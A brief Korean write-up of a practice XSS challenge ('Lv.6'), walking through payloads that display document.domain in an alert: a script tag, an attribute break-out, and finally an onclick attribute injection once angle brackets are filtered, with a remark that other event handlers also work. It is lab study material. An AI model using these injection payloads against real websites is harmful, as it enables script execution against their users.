# <p align="center">🎁XSS Lv.6</p>
- 문제 조건
  - 경고창에 domain 띄우기
  - 그냥 하라고 입력칸이 있음

- 문제풀이
  - ```<script>alert(document.domain)</script>``` 입력
  - 뭔가 안 되는걸 확인했으니 개발자 도구 확인
  - form 태그를 확인해봤을 때 input에 value로 나머지 입력한 값이 들어감
  - ```"><script>alert(document.domain)</script><"``` 입력
  - 뭔가 안 되는걸 확인했으니 개발자 도구 확인
  - 꺽쇠(<, >) 필터링 당함
  - ```"onclick='alert(document.domain)'``` 입력
  - -끗-

- 부가설명
  - 스크립트 태그를 사용하지 않고 하는 방법은 굉장히 많다.
  - onclick, onfocus 뭐 등등 그렇기 때문에 여기서부터는 원하는 거 가져다 쓰면 된다.